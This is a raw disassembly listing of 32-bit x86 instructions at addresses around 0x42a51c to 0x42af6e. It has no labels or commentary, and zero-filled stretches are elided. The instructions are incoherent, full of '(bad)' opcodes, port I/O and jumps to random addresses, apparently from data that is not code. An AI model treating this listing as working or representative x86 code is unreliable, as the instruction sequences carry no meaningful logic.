  42a51c:	pop    ebp
  42a51d:	shr    BYTE PTR [ebx-0x7a],cl
  42a520:	inc    ebx
  42a521:	sub    ebp,ebp
  42a523:	lds    esp,FWORD PTR [ebx]
  42a525:	pop    esp
  42a526:	push   ebp
  42a527:	sbb    al,0xa0
  42a529:	popf   
  42a52a:	add    bh,BYTE PTR [eax-0x6593f3af]
  42a530:	sub    DWORD PTR ds:0x6adf1a45,ebx
  42a536:	inc    edx
  42a537:	add    edx,DWORD PTR [edx*1+0x5455e766]
  42a53e:	pushf  
  42a53f:	sub    al,0x12
	...
  42a5b1:	add    BYTE PTR [eax],al
  42a5b3:	add    BYTE PTR [ebp+0x1d],ch
  42a5b6:	out    0xc0,al
  42a5b8:	idiv   bl
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	jmp    0xb551b53b
  42a5c5:	rol    BYTE PTR [ecx],0x0
  42a5c8:	cmc    
  42a5c9:	add    BYTE PTR [eax],al
  42a5cb:	add    BYTE PTR [edx+ebp*1+0x30a472aa],al
  42a5d2:	ins    DWORD PTR es:[edi],dx
  42a5d3:	ds in  eax,dx
  42a5d5:	shr    BYTE PTR [ecx+0x10],0x40
  42a5d9:	or     dl,BYTE PTR [ebx+0x5dfeeafc]
  42a5df:	mov    esp,0xecd33856
  42a5e4:	fs mov ebp,0x99036948
  42a5ea:	jns    0x42a5d8
  42a5ec:	mov    ebx,0x8486adb1
  42a5f1:	pop    ss
  42a5f2:	lea    ebx,[edx-0x2ad2da0f]
  42a5f8:	mov    WORD PTR [ecx+0x7],gs
  42a5fb:	push   eax
  42a5fc:	sbb    eax,0xd6367206
  42a601:	out    dx,al
  42a602:	add    eax,0x6df52819
  42a607:	or     al,0xd6
  42a609:	and    edx,eax
  42a60b:	pop    es
  42a60c:	sub    eax,0xe15e0101
  42a611:	mov    al,BYTE PTR [ebp+0x10e3852d]
  42a617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a618:	aaa    
  42a619:	add    edx,ecx
  42a61b:	mov    ch,BYTE PTR [eax-0x774fdd57]
  42a621:	fmul   QWORD PTR [ebp+0x148bda2f]
  42a627:	and    eax,0x93bc63b
  42a62c:	xchg   DWORD PTR [ebp+0x3b],ebx
  42a62f:	xchg   esi,eax
  42a630:	or     al,BYTE PTR [eax]
  42a632:	clc    
  42a633:	sbb    edi,ebx
  42a635:	out    dx,al
  42a636:	(bad)  
  42a637:	jl     0x42a641
  42a639:	cdq    
  42a63a:	ja     0x42a5d4
  42a63c:	xor    edx,DWORD PTR [ecx]
  42a63e:	mov    al,0xdd
  42a640:	pop    ds
  42a641:	pop    ebx
  42a642:	cmp    BYTE PTR [edx+0x53d4ea22],cl
  42a648:	shr    BYTE PTR [esi+0x224322bc],1
  42a64e:	repnz push ss
  42a650:	shl    DWORD PTR [ebx-0x3b],1
  42a653:	sbb    BYTE PTR [ecx+0x19],ah
  42a656:	pop    ebx
  42a657:	xor    ecx,DWORD PTR [esi]
  42a659:	add    DWORD PTR [esi+0x6fdaffce],ecx
  42a65f:	lods   al,BYTE PTR ds:[esi]
  42a660:	aaa    
  42a661:	ja     0x42a6bc
  42a663:	mov    edx,0xdb63d06
  42a668:	dec    ebp
  42a669:	shr    BYTE PTR [edx+ebx*2+0x33],1
  42a66d:	js     0x42a6dd
  42a66f:	mov    ecx,0xa6836e99
  42a674:	ins    DWORD PTR es:[edi],dx
  42a675:	and    eax,0x961a2ea
  42a67a:	jno    0x42a661
  42a67c:	scas   eax,DWORD PTR es:[edi]
  42a67d:	jl     0x42a682
  42a67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a680:	dec    ebx
  42a681:	xchg   esp,eax
  42a682:	cld    
  42a683:	xlat   BYTE PTR ds:[ebx]
  42a684:	dec    ebx
  42a685:	pusha  
  42a686:	sbb    eax,0x38707d5b
  42a68b:	scas   eax,DWORD PTR es:[edi]
  42a68c:	pop    es
  42a68d:	xchg   esp,eax
  42a68e:	scas   al,BYTE PTR es:[edi]
  42a68f:	xchg   ebp,eax
  42a690:	push   0xffffffe4
  42a692:	imul   esp,edx,0xfffffffc
  42a695:	mov    ds,WORD PTR [eax]
  42a697:	imul   edi,esi,0xffffff9f
  42a69a:	or     eax,0xac323a99
  42a69f:	or     eax,DWORD PTR [esi-0x3b]
  42a6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a6a3:	fadd   st(6),st
  42a6a5:	js     0x42a633
  42a6a7:	pop    edx
  42a6a8:	mov    ?,ebx
  42a6aa:	sbb    dh,bh
  42a6ac:	sbb    eax,0xb70a4123
  42a6b1:	out    dx,al
  42a6b2:	or     al,0xe3
  42a6b4:	sbb    bl,0xc3
  42a6b7:	or     cl,bl
  42a6b9:	loop   0x42a673
  42a6bb:	and    dl,BYTE PTR [eax]
  42a6bd:	aas    
  42a6be:	les    ecx,FWORD PTR [eax+0x2d]
	...
  42a731:	add    BYTE PTR [eax],al
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	out    0x59,eax
  42a742:	sbb    al,0xb4
  42a744:	stos   BYTE PTR es:[edi],al
  42a745:	rol    DWORD PTR [ecx],0x0
  42a748:	cmc    
  42a749:	add    BYTE PTR [eax],al
  42a74b:	add    BYTE PTR [edx],ah
  42a74d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a74e:	cmp    ebx,DWORD PTR [edi+0x22c8af3a]
  42a754:	ins    DWORD PTR es:[edi],dx
  42a755:	leave  
  42a756:	add    edx,DWORD PTR [eax-0xb868c1a]
  42a75c:	jg     0x42a70b
  42a75e:	mov    esp,0x9cfa77c2
  42a763:	lods   eax,DWORD PTR ds:[esi]
  42a764:	and    eax,0xfe59c533
  42a769:	lods   eax,DWORD PTR ds:[esi]
  42a76a:	sar    DWORD PTR [edi+ecx*2+0x39],1
  42a76e:	jns    0x42a76c
  42a770:	inc    edi
  42a771:	ret    
  42a772:	js     0x42a782
  42a774:	mov    eax,0xe14ea626
  42a779:	inc    edx
  42a77a:	and    bh,ch
  42a77c:	ja     0x42a7c6
  42a77e:	test   eax,ecx
  42a780:	fimul  DWORD PTR [ebp+ebp*4-0x7b]
  42a784:	jne    0x42a775
  42a786:	pop    esp
  42a787:	mov    esp,0xdaf244af
  42a78c:	ret    0x3bae
  42a78f:	mov    esi,0x6bde81fe
  42a794:	enter  0xa13f,0x37
  42a798:	fs out dx,al
  42a79a:	sub    al,BYTE PTR [ebx]
  42a79c:	jns    0x42a770
  42a79e:	ret    0x54a9
  42a7a1:	cmp    al,0x9d
  42a7a3:	push   es
  42a7a4:	fcomp  DWORD PTR [eax]
  42a7a6:	bound  esi,QWORD PTR [ecx-0x66]
  42a7a9:	ins    BYTE PTR es:[edi],dx
  42a7aa:	push   es
  42a7ab:	pop    edx
  42a7ac:	test   BYTE PTR [edi+0x1301a1ba],bh
  42a7b2:	(bad)  
  42a7b3:	mov    ?,WORD PTR es:[edi-0x20605606]
  42a7ba:	adc    DWORD PTR [ebx],edx
  42a7bc:	xchg   edx,eax
  42a7bd:	repnz fwait
  42a7bf:	lahf   
  42a7c0:	test   eax,0xc27d7707
  42a7c5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42a7c7:	xor    ah,ah
  42a7c9:	lds    esp,FWORD PTR gs:[esi+0x6b70705f]
  42a7d0:	fbld   TBYTE PTR [ebx]
  42a7d2:	fcmovne st,st(7)
  42a7d4:	scas   eax,DWORD PTR es:[edi]
  42a7d5:	mov    BYTE PTR [ebp+0x6b5d662e],bh
  42a7db:	mov    ebx,0xfed86787
  42a7e0:	cwde   
  42a7e1:	scas   al,BYTE PTR es:[edi]
  42a7e2:	pop    ebx
  42a7e3:	dec    esp
  42a7e4:	leave  
  42a7e5:	mov    BYTE PTR [edi],bh
  42a7e7:	sub    ah,BYTE PTR gs:[ecx]
  42a7ea:	inc    edx
  42a7eb:	rcr    eax,cl
  42a7ed:	and    edx,edi
  42a7ef:	and    ebp,DWORD PTR [edx]
  42a7f1:	sbb    esp,DWORD PTR [esi+0x35]
  42a7f4:	mov    dl,0xd0
  42a7f6:	ins    DWORD PTR es:[edi],dx
  42a7f7:	stos   BYTE PTR es:[edi],al
  42a7f8:	and    eax,0x2191c690
  42a7fd:	push   cs
  42a7fe:	aad    0x13
  42a800:	sub    BYTE PTR [eax],dh
  42a802:	loope  0x42a867
  42a804:	ja     0x42a78d
  42a806:	lds    eax,FWORD PTR ds:0xb4562687
  42a80c:	test   BYTE PTR [edi],ah
  42a80e:	stos   DWORD PTR es:[edi],eax
  42a80f:	xor    al,0x29
  42a811:	pop    esi
  42a812:	mov    ecx,0xfc8081c3
  42a817:	jnp    0x42a85e
  42a819:	imul   DWORD PTR [esi+0x7de1a225]
  42a81f:	and    eax,0x6d1d3234
  42a824:	in     al,0xfd
  42a826:	xor    ah,bh
  42a828:	push   es
  42a829:	pop    edx
  42a82a:	jg     0x42a7f4
  42a82c:	xor    BYTE PTR [ebx-0xa],dl
  42a82f:	dec    ebp
  42a830:	in     eax,0x74
  42a832:	mov    ds:0xf51dd013,al
  42a837:	mov    ecx,0x488a0883
  42a83c:	sub    cl,BYTE PTR [ecx]
  42a83e:	(bad)  
  42a83f:	ins    DWORD PTR es:[edi],dx
  42a840:	xchg   DWORD PTR [eax],eax
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	lahf   
  42a8c1:	adc    DWORD PTR ds:0x1c29ffe,0xf500
  42a8cb:	add    BYTE PTR [edx+0x2f],ch
  42a8ce:	repz add BYTE PTR [edx],al
  42a8d1:	dec    edi
  42a8d2:	mov    bx,0xe31c
  42a8d6:	rol    BYTE PTR [edi+esi*8],cl
  42a8d9:	outs   dx,BYTE PTR ds:[esi]
  42a8da:	test   DWORD PTR [ebx+0x7938eaa9],esp
  42a8e0:	xchg   DWORD PTR [ebx+edx*8-0x56],ebp
  42a8e4:	xchg   esi,eax
  42a8e5:	xor    al,0xcf
  42a8e7:	and    DWORD PTR ds:0x4ca74f29,ebp
  42a8ed:	mov    DWORD PTR [eax+0x4e],ebx
  42a8f0:	add    dl,BYTE PTR [eax+0x2b72ff44]
  42a8f6:	mov    esp,0xd1b2b289
  42a8fb:	pop    ecx
  42a8fc:	sbb    ebx,DWORD PTR [esi+0x2a8026d7]
  42a902:	mov    al,ds:0x85681969
  42a907:	aas    
  42a908:	xchg   esp,eax
  42a909:	jns    0x42a91c
  42a90b:	cmp    ecx,0x96b26fcc
  42a911:	adc    bh,BYTE PTR [ebx-0xa]
  42a914:	out    0x5e,al
  42a916:	jp     0x42a8c4
  42a918:	into   
  42a919:	xor    DWORD PTR [eax+0x62],edi
  42a91c:	or     ecx,DWORD PTR [esi]
  42a91e:	dec    edx
  42a91f:	stos   BYTE PTR es:[edi],al
  42a920:	aas    
  42a921:	xchg   esp,eax
  42a922:	mov    ebx,DWORD PTR [edi-0x74]
  42a925:	mov    ah,0x15
  42a927:	call   ebx
  42a929:	jmp    0x99051c01
  42a92e:	in     al,dx
  42a92f:	and    BYTE PTR [esi],0x38
  42a932:	xlat   BYTE PTR ds:[ebx]
  42a933:	push   ebx
  42a934:	or     ebp,edi
  42a936:	or     BYTE PTR [ecx+0x716b5501],ah
  42a93c:	cwde   
  42a93d:	call   0xa3d4cc33
  42a942:	push   ebx
  42a943:	cld    
  42a944:	ret    
  42a945:	cmp    eax,0xae10e448
  42a94a:	and    BYTE PTR [edx-0x5],dl
  42a94d:	ins    BYTE PTR es:[edi],dx
  42a94e:	pushf  
  42a94f:	in     eax,dx
  42a950:	add    esp,DWORD PTR ds:0xf4bd1b1d
  42a956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a957:	xor    ebx,edx
  42a959:	js     0x42a988
  42a95b:	popf   
  42a95c:	cmp    DWORD PTR [ebp+edi*4-0x3c],edi
  42a960:	fiadd  WORD PTR [edi+eax*1+0x6d]
  42a964:	out    dx,al
  42a965:	jg     0x42a9c1
  42a967:	call   0x44bc:0xf6167de7
  42a96e:	dec    ecx
  42a96f:	shl    BYTE PTR [ecx],0xc2
  42a972:	and    DWORD PTR [ecx],esi
  42a974:	jmp    0x698e:0xf4196976
  42a97b:	sub    edx,DWORD PTR [ebx+0x56]
  42a97e:	clc    
  42a97f:	(bad)  
  42a980:	cmp    ch,ch
  42a982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a983:	int3   
  42a984:	inc    esp
  42a985:	xchg   esi,eax
  42a986:	jne    0x42a94f
  42a988:	fs call 0x3fc3bd16
  42a98e:	loope  0x42aa02
  42a990:	jmp    0xdd38b0ea
  42a995:	mov    WORD PTR [ebp+0x53605dc8],es
  42a99b:	call   0xb5c7c8f4
  42a9a0:	mov    esp,0x794e731c
  42a9a5:	mov    dh,0x2d
  42a9a7:	sbb    bl,ah
  42a9a9:	pop    ebx
  42a9aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a9ab:	mov    cl,0x63
  42a9ad:	add    al,0xe6
  42a9af:	mov    ebx,0x181fee8a
  42a9b4:	cmp    edi,DWORD PTR [eax-0x1159f28b]
  42a9ba:	xor    al,0x7c
  42a9bc:	xor    DWORD PTR [ecx+0xa441e5],ebx
	...
  42aa32:	add    BYTE PTR [eax],al
  42aa34:	into   
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	in     eax,dx
  42aa41:	test   al,0x3b
  42aa43:	jmp    0xf5:0x1c394
  42aa4a:	add    BYTE PTR [eax],al
  42aa4c:	bound  esi,QWORD PTR [ebp-0x3d]
  42aa4f:	sub    eax,0xa4fa5977
  42aa54:	cdq    
  42aa55:	jmp    0x42aa85
  42aa57:	clc    
  42aa58:	sub    DWORD PTR [ebx],esi
  42aa5a:	jne    0x42aa95
  42aa5c:	adc    eax,DWORD PTR [ebp-0x52acde98]
  42aa62:	loopne 0x42aaab
  42aa64:	ffreep st(5)
  42aa66:	inc    esp
  42aa67:	call   0xf3e26281
  42aa6c:	sub    BYTE PTR ss:[ecx+ebx*1+0x6f0ff026],bl
  42aa74:	cdq    
  42aa75:	jmp    0x42aaba
  42aa77:	nop
  42aa78:	and    eax,0xdae0ab67
  42aa7d:	sub    eax,edx
  42aa7f:	dec    ebx
  42aa80:	aad    0x87
  42aa82:	sub    al,bl
  42aa84:	mov    DWORD PTR [edi-0x1fe0b284],ebx
  42aa8a:	jno    0x42aa74
  42aa8c:	popf   
  42aa8d:	add    ebx,DWORD PTR [edx+ebx*4-0x73]
  42aa91:	jne    0x42aace
  42aa93:	or     BYTE PTR [eax+0x5500a31],al
  42aa99:	and    BYTE PTR [ebp-0x69],bl
  42aa9c:	into   
  42aa9d:	xchg   edx,eax
  42aa9e:	jb     0x42ab05
  42aaa0:	out    0xc4,eax
  42aaa2:	adc    bh,bl
  42aaa4:	sub    edx,esp
  42aaa6:	es jl  0x42aadc
  42aaa9:	test   DWORD PTR [ebx-0x11],edi
  42aaac:	xor    al,bl
  42aaae:	inc    edx
  42aaaf:	sub    BYTE PTR [ecx+0x2b722c0e],al
  42aab5:	pusha  
  42aab6:	int3   
  42aab7:	rol    edx,cl
  42aab9:	aam    0x6
  42aabb:	(bad)  
  42aabc:	dec    esi
  42aabd:	add    al,0x5d
  42aabf:	push   edi
  42aac0:	dec    ebx
  42aac1:	in     al,0xbd
  42aac3:	cmc    
  42aac4:	dec    edi
  42aac5:	push   cs
  42aac6:	xor    esp,DWORD PTR [eax+ebx*1-0x22]
  42aaca:	jno    0x42aa9e
  42aacc:	pop    ss
  42aacd:	loope  0x42ab35
  42aacf:	xor    edx,DWORD PTR [ebp+esi*2+0x5a439b0b]
  42aad6:	or     DWORD PTR [edi],esp
  42aad8:	add    al,BYTE PTR [ecx]
  42aada:	sub    BYTE PTR [eax+ebp*4],bh
  42aadd:	imul   eax,DWORD PTR [esi],0xffffffc9
  42aae0:	inc    edx
  42aae1:	push   cs
  42aae2:	daa    
  42aae3:	into   
  42aae4:	mov    ds:0xff0b1c5,eax
  42aae9:	sbb    ebx,ecx
  42aaeb:	inc    edx
  42aaec:	rcl    BYTE PTR [edi+0x7a],1
  42aaef:	mov    al,ds:0x365dace7
  42aaf4:	leave  
  42aaf5:	cwde   
  42aaf6:	inc    edi
  42aaf7:	outs   dx,DWORD PTR ds:[esi]
  42aaf8:	sub    eax,0x28fe43fb
  42aafd:	shl    ebp,cl
  42aaff:	ret    
  42ab00:	outs   dx,BYTE PTR ds:[esi]
  42ab01:	lahf   
  42ab02:	dec    edx
  42ab03:	ins    DWORD PTR es:[edi],dx
  42ab04:	js     0x42ab4d
  42ab06:	adc    eax,0x1610ecc5
  42ab0b:	or     eax,0xbb30f64f
  42ab10:	push   0x2693e464
  42ab15:	pop    ss
  42ab16:	aaa    
  42ab17:	leave  
  42ab18:	imul   ebp,esp,0xffffffa5
  42ab1b:	nop
  42ab1c:	mov    edx,0x5bd328df
  42ab21:	sub    BYTE PTR [ebp+ebx*4-0x1282b5a1],ch
  42ab28:	or     ebp,DWORD PTR [esi-0x14]
  42ab2b:	jmp    0x410c:0x3191dbb1
  42ab32:	out    dx,eax
  42ab33:	sub    dl,ch
  42ab35:	push   ebx
  42ab36:	add    BYTE PTR [esp+eax*8+0x4b62cbf3],dh
  42ab3d:	out    0x1b,eax
  42ab3f:	pop    esp
  42ab40:	pop    ss
	...
  42abb1:	add    BYTE PTR [eax],al
  42abb3:	add    BYTE PTR [ebx-0x487759ea],ah
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	shr    DWORD PTR [ecx-0x3b76878a],cl
  42abc6:	add    DWORD PTR [eax],eax
  42abc8:	cmc    
  42abc9:	add    BYTE PTR [eax],al
  42abcb:	add    BYTE PTR [esp+ebx*4+0x12],al
  42abcf:	in     eax,dx
  42abd0:	adc    al,0x77
  42abd2:	jo     0x42ac11
  42abd4:	test   DWORD PTR [ebx],ebx
  42abd6:	(bad)  
  42abd7:	out    0xcc,eax
  42abd9:	xchg   edi,eax
  42abda:	sub    al,0xa6
  42abdc:	jne    0x42abdd
  42abde:	add    ebp,DWORD PTR [edx]
  42abe0:	sahf   
  42abe1:	int3   
  42abe2:	and    BYTE PTR [ecx-0x23],cl
  42abe5:	fnsave [edi+0x59]
  42abe8:	sti    
  42abe9:	idiv   BYTE PTR [esp+ebx*2+0x362b90a3]
  42abf0:	sub    eax,0xcdf7ad00
  42abf5:	add    ch,BYTE PTR [eax+0x6c3673f9]
  42abfb:	jbe    0x42ac2b
  42abfd:	cld    
  42abfe:	stos   BYTE PTR es:[edi],al
  42abff:	les    edi,FWORD PTR [ebp+0x58]
  42ac02:	xlat   BYTE PTR ds:[ebx]
  42ac03:	mov    esp,0x64acb8cb
  42ac08:	imul   BYTE PTR ds:0x4fd0fbac
  42ac0e:	mov    cl,0x7a
  42ac10:	(bad)  
  42ac11:	(bad)  
  42ac13:	call   0x6461:0xbeaae769
  42ac1a:	adc    ch,BYTE PTR [edx]
  42ac1c:	stos   BYTE PTR es:[edi],al
  42ac1d:	daa    
  42ac1e:	ja     0x42ac6f
  42ac20:	fdiv   DWORD PTR [eax]
  42ac22:	cmc    
  42ac23:	xlat   BYTE PTR ds:[ebx]
  42ac24:	xchg   esp,eax
  42ac25:	jmp    0xc575d0f4
  42ac2a:	mov    edi,DWORD PTR [ecx+0x4e]
  42ac2d:	mov    DWORD PTR [ebx+0x39],esi
  42ac30:	add    DWORD PTR [eax-0xf59d7f4],ebx
  42ac36:	inc    esi
  42ac37:	mov    ecx,0x690e0d55
  42ac3c:	loop   0x42ac7d
  42ac3e:	pop    ss
  42ac3f:	cmp    ebx,DWORD PTR [ebx]
  42ac41:	push   esp
  42ac42:	pushf  
  42ac43:	adc    esi,DWORD PTR ds:0x3e1ecb11
  42ac49:	(bad)  
  42ac4b:	retf   
  42ac4c:	inc    ecx
  42ac4d:	push   edx
  42ac4e:	or     DWORD PTR [edx+0x46e2bed7],ebp
  42ac54:	xor    ecx,DWORD PTR [edx-0x70b90c5c]
  42ac5a:	jg     0x42acaa
  42ac5c:	pop    ebx
  42ac5d:	and    eax,ebx
  42ac5f:	and    DWORD PTR [esi],0x36
  42ac62:	xor    DWORD PTR [ebp-0x41],esi
  42ac65:	push   esi
  42ac66:	hlt    
  42ac67:	cmp    esi,0x6d59d794
  42ac6d:	xchg   WORD PTR [ecx+0x7a],bx
  42ac71:	sar    DWORD PTR [esi-0x63c6df1b],1
  42ac77:	or     al,0xd0
  42ac79:	xor    esp,DWORD PTR [ebp+0x54]
  42ac7c:	jns    0x42acaa
  42ac7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac7f:	into   
  42ac80:	aaa    
  42ac81:	test   ah,bl
  42ac83:	sahf   
  42ac84:	scas   al,BYTE PTR es:[edi]
  42ac85:	repz out dx,al
  42ac87:	es xchg ebp,eax
  42ac89:	je     0x42ac97
  42ac8b:	push   eax
  42ac8c:	inc    ebp
  42ac8d:	add    al,0xfd
  42ac8f:	mov    bl,0x8e
  42ac91:	sti    
  42ac92:	gs push 0x58
  42ac95:	mov    dh,0x55
  42ac97:	addr16 inc esi
  42ac99:	imul   edi,DWORD PTR [ebp+0x16],0xd5ca0b50
  42aca0:	repnz out 0xe4,al
  42aca3:	dec    ebx
  42aca4:	fwait
  42aca5:	cdq    
  42aca6:	mov    ebx,0x66d01e7b
  42acab:	imul   bl
  42acad:	dec    edi
  42acae:	ror    BYTE PTR [edx+esi*4+0x0],cl
  42acb2:	or     BYTE PTR [ecx],dl
  42acb4:	test   BYTE PTR [edx+0x39cce2af],bh
  42acba:	int    0x77
  42acbc:	jp     0x42ac7f
  42acbe:	shr    DWORD PTR [edi],0x24
	...
  42ad31:	add    BYTE PTR [eax],al
  42ad33:	add    BYTE PTR [ebx-0x13f33b49],bl
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	pandn  mm5,QWORD PTR [edi-0x3a81e671]
  42ad46:	add    DWORD PTR [eax],eax
  42ad48:	cmc    
  42ad49:	add    BYTE PTR [eax],al
  42ad4b:	add    ah,bh
  42ad4d:	push   ebx
  42ad4e:	or     DWORD PTR [esi+0x14],edx
  42ad51:	cmp    DWORD PTR [edx-0x6f],esi
  42ad54:	or     eax,0xc9d818a6
  42ad59:	lods   eax,DWORD PTR ds:[esi]
  42ad5a:	das    
  42ad5b:	stc    
  42ad5c:	adc    al,0x89
  42ad5e:	dec    ebp
  42ad5f:	dec    edi
  42ad60:	xchg   ecx,eax
  42ad61:	enter  0xddb3,0xa2
  42ad65:	dec    esp
  42ad66:	sbb    eax,0x7c096808
  42ad6b:	rol    DWORD PTR [ecx-0x54],0x0
  42ad6f:	or     ch,BYTE PTR [eax+0x6351b03d]
  42ad75:	add    DWORD PTR [eax+0x1d],ecx
  42ad78:	sbb    BYTE PTR [edx+edi*8-0x15],0x30
  42ad7d:	cmp    al,0x61
  42ad7f:	fsubrp st(3),st
  42ad81:	sbb    eax,0x624f4dce
  42ad86:	pop    ebp
  42ad87:	push   ebp
  42ad88:	cmp    BYTE PTR [ebp+0x71],0x9a
  42ad8c:	add    bh,cl
  42ad8e:	sub    al,0x23
  42ad90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad91:	or     DWORD PTR [ebp-0x9],0xffffffc1
  42ad95:	inc    esi
  42ad96:	call   0xecc03374
  42ad9b:	out    0xe4,al
  42ad9d:	out    dx,eax
  42ad9e:	pop    edi
  42ad9f:	cli    
  42ada0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ada1:	retf   
  42ada2:	(bad)  [bp-0x55]
  42ada6:	inc    esi
  42ada7:	adc    dl,al
  42ada9:	(bad)  
  42adaa:	lahf   
  42adab:	xor    BYTE PTR [eax+0x35e96255],ch
  42adb1:	jne    0x42adc0
  42adb3:	mov    ah,0x54
  42adb5:	imul   ecx,esp,0x61
  42adb8:	lock push ebp
  42adba:	lahf   
  42adbb:	or     BYTE PTR [ebx-0x6c022145],cl
  42adc1:	xor    dl,BYTE PTR [ebx]
  42adc3:	repz or BYTE PTR [ecx+0xa],0xd8
  42adc8:	ins    DWORD PTR es:[edi],dx
  42adc9:	inc    esp
  42adca:	stc    
  42adcb:	das    
  42adcc:	enter  0x1dc5,0x2e
  42add0:	lea    edx,[esp+edi*1]
  42add3:	nop    DWORD PTR [ebx+0x2886e5c3]
  42adda:	mov    dl,0x91
  42addc:	pop    DWORD PTR [ecx+esi*1]
  42addf:	loopne 0x42add2
  42ade1:	lds    eax,FWORD PTR [ebp+0x2e]
  42ade4:	rcr    edx,cl
  42ade6:	fcom   DWORD PTR ds:0x94bba505
  42adec:	sub    BYTE PTR [edx-0x23],dh
  42adef:	lahf   
  42adf0:	fwait
  42adf1:	lds    eax,FWORD PTR [ebp+0x42240bdd]
  42adf7:	inc    ebp
  42adf8:	add    al,0x31
  42adfa:	add    BYTE PTR [eax-0x22],dl
  42adfd:	add    DWORD PTR [edi-0x300a7585],eax
  42ae03:	nop
  42ae04:	(bad)  
  42ae06:	inc    esi
  42ae07:	cmp    eax,DWORD PTR [ecx]
  42ae09:	jae    0x42ad8d
  42ae0b:	in     al,0x75
  42ae0d:	sub    esi,eax
  42ae0f:	test   DWORD PTR [esp+edi*4+0x5a],esp
  42ae13:	sbb    DWORD PTR es:[edi-0x1d],0x7c
  42ae18:	pop    esp
  42ae19:	mov    al,0x65
  42ae1b:	sbb    eax,0xc6613a69
  42ae20:	adc    esp,DWORD PTR [edi-0x1fe0aa99]
  42ae26:	adc    DWORD PTR [edx],esi
  42ae28:	aam    0x80
  42ae2a:	std    
  42ae2b:	fstp   DWORD PTR [ecx-0x3d]
  42ae2e:	xchg   esp,eax
  42ae2f:	jb     0x42ae74
  42ae31:	retf   
  42ae32:	xchg   ebp,eax
  42ae33:	jmp    edi
  42ae35:	int3   
  42ae36:	outs   dx,BYTE PTR ds:[esi]
  42ae37:	in     eax,0x57
  42ae39:	shr    BYTE PTR [ebp+ebx*8+0x63],cl
  42ae3d:	and    al,0xf9
  42ae3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae40:	xchg   esi,eax
	...
  42aeb1:	add    BYTE PTR [eax],al
  42aeb3:	add    BYTE PTR [ecx],dh
  42aeb5:	inc    ebp
  42aeb6:	enter  0xfc06,0x8f
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	xor    DWORD PTR [esi-0x398c7d50],ecx
  42aec6:	add    DWORD PTR [eax],eax
  42aec8:	cmc    
  42aec9:	add    BYTE PTR [eax],al
  42aecb:	add    bl,dl
  42aecd:	jmp    0xfa502460
  42aed2:	jnp    0x42aea4
  42aed4:	(bad)  
  42aed5:	mov    bh,0x9f
  42aed7:	inc    edi
  42aed8:	cmc    
  42aed9:	retf   
  42aeda:	jns    0x42af06
  42aedc:	lock inc esi
  42aede:	jle    0x42aee6
  42aee0:	lock mov ch,0xf8
  42aee3:	daa    
  42aee4:	and    ebx,ebp
  42aee6:	xor    eax,ebp
  42aee8:	aaa    
  42aee9:	rcr    BYTE PTR [edi-0x33],cl
  42aeec:	push   ebx
  42aeed:	std    
  42aeee:	scas   eax,DWORD PTR es:[edi]
  42aeef:	mov    dh,0xe
  42aef1:	and    al,0xa9
  42aef3:	scas   eax,DWORD PTR es:[edi]
  42aef4:	mov    ds:0xebd94dce,al
  42aef9:	lods   al,BYTE PTR ds:[esi]
  42aefa:	cmp    edx,DWORD PTR [ebx]
  42aefc:	es daa 
  42aefe:	nop
  42aeff:	mov    al,0x3b
  42af01:	mov    esp,0xe538342a
  42af06:	jmp    0xdab9ef4c
  42af0b:	enter  0xc787,0x4
  42af0f:	mov    ecx,0x1a3a1d54
  42af14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af15:	jae    0x42af85
  42af17:	pop    esp
  42af18:	mov    bh,0x79
  42af1a:	sbb    BYTE PTR [ebx-0x78e04df3],dl
  42af20:	int3   
  42af21:	mov    bl,BYTE PTR [esi]
  42af23:	pop    esi
  42af24:	std    
  42af25:	lds    ebx,FWORD PTR [eax+0x3d]
  42af28:	ret    0x18c0
  42af2b:	push   cs
  42af2c:	sub    eax,0xc85b4759
  42af31:	add    ecx,DWORD PTR [esi]
  42af33:	outs   dx,BYTE PTR ds:[esi]
  42af34:	adc    ebp,edx
  42af36:	push   0x83487cd3
  42af3b:	and    al,0x21
  42af3d:	mov    DWORD PTR [eax+0x27b78214],esp
  42af43:	dec    esi
  42af44:	mov    bl,0x8a
  42af46:	jns    0x42af62
  42af48:	add    eax,0x453ceedc
  42af4d:	repnz rcr DWORD PTR [edi],0xba
  42af51:	xor    edi,DWORD PTR [eax+ebx*8-0x162e5eaa]
  42af58:	add    dl,BYTE PTR [ecx+esi*8-0x57]
  42af5c:	jne    0x42af35
  42af5e:	jl     0x42af63
  42af60:	jns    0x42af2a
  42af62:	cmp    eax,0x92670d7d
  42af67:	stos   DWORD PTR es:[edi],eax
  42af68:	shl    ah,cl
  42af6a:	adc    DWORD PTR [edi+0x4],edi
  42af6d:	retf   
  42af6e:	sbb    eax,0xea033a29
